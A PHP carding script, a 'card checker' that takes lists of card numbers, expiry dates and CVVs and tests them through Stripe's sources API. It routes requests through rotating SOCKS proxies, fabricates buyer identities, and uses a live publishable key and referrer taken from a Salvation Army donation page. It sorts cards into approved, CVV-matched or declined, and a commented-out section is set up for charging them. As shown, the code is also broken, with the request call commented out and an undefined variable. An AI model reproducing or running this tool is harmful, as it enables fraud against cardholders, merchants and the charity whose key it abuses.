<?php

////////////////////////////===[Enter Your Site Name Here]

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function monarchproxys()
{
  $poxySocks = file("Socks5.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = monarchproxys();

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Luminati Details]

$username = '#';
$password = '#';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
/////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
////////=========Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: application/json', 
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://js.stripe.com',
'referer: https://js.stripe.com/v3/controller-6cf7a4aa9b4e877012ef2577f3c5327f.html',
'Sec-Fetch-Mode: cors',));
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=95da8616-f593-4fdb-b65b-ee72d0a7cc56&muid=787c7ab2-8275-4a03-95c7-4874523120ac&sid=48b39956-61de-46a2-81fa-9bf01d1e69fa&pasted_fields=number&payment_user_agent=stripe.js%2Fce297a58%3B+stripe-js-v3%2Fce297a58&time_on_page=87117&referrer=https%3A%2F%2Fgive.salvationarmyusa.org%2Fgive%2F164006%2F&key=pk_live_h5ocNWNpicLCfBJvLialXsb900SaJnJscz');
//echo $result = curl_exec($ch);

// $token = trim(strip_tags(getStr($result,'"id": "','"')));

// //////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]

// $ch = curl_init();
// /////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// ////////=========Socks Proxy
// //curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
// curl_setopt($ch, CURLOPT_URL, '#');
// curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//   'accept: #',
//   'content-type: #',
//   'cookie: #',  
//   'origin: #',
//   'referer: #',
//   'Sec-Fetch-Mode: #',));
// curl_setopt($ch, CURLOPT_POSTFIELDS, '#');

// echo $result = curl_exec($ch);
// $message = trim(strip_tags(getStr($result,'"message":"','"'))); 

////////////////////////////===[Card Response]

if (strpos($result, '"cvc_check":"pass"')) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVV MATCHED ★ Luminati Proxy ★ </span></br>';
}
elseif (strpos($result, 'incorrect_zip')) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVV MATCHED -  Incorrect Zip★ Luminati Proxy ★ </span></br>';
}
elseif (strpos($result, 'security code is incorrect.')) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CCN MATCHED ★ Luminati Proxy ★ </span></br>';
}
elseif (strpos($result, 'insufficient_funds')) {
  echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ Insufficient Funds ★ Luminati Proxy ★ </span></br>';
}
elseif (strpos($result, 'incorrect_number')) {
  echo '<span class="new badge red">#Declined</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Incorrect Number ★ Luminati Proxy ★</span> </br>';
}
elseif (strpos($result, '"decline_code": "generic_decline"')) {
  echo '<span class="new badge red">#Declined</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Declined ★ Luminati Proxy ★</span> </br>';
}
elseif (strpos($result, '"decline_code": "do_not_honor"')) {
  echo '<span class="new badge red">#Declined</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Declined : Do Not Honor ★ Luminati Proxy ★</span> </br>';
}
elseif (strpos($result, 'card_expired')) {
  echo '<span class="new badge red">#Declined</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Expired ★ Luminati Proxy ★</span> </br>';
}
elseif (strpos($result, 'lost_card')) {
  echo '<span class="new badge red">#Declined</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Lost Card ★ Luminati Proxy ★</span> </br>';
}
elseif (strpos($result, 'stolen_card')) {
  echo '<span class="new badge red">#Declined</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Stolen Card ★ Luminati Proxy ★</span> </br>';
}
 else {
  echo '<span class="new badge red">#Declined</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Proxy Dead / Error Not Listed ★ Luminati Proxy ★</span> </br>';
}

curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response
///echo $result
//////////////////===============================================\\\\\\\\\\\\\\\
?>
